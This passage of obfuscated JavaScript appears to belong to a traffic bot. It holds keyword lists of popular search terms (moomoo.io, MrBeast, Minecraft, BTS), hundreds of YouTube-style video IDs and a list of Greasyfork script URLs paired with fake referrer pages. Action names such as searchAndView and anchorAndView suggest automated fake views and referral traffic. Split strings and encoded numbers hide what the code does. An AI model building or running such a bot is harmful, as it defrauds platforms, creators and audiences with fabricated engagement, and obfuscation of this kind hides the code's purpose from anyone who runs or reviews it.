      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1 * 0x5e + 0x1bec + -0x1c40)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1 * -0x419 + -0x1966 + 0x1d89)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x3 * 0x7c2 + 0x1 * -0x1c24 + 0x336d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    Y(0xc, 'd0Zi') + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    Z(0x13) + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    Z(0x0) + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    a0(0x16) + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    Y(0x11, 'Wh!q') + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': Z(0x17) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0xf) + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
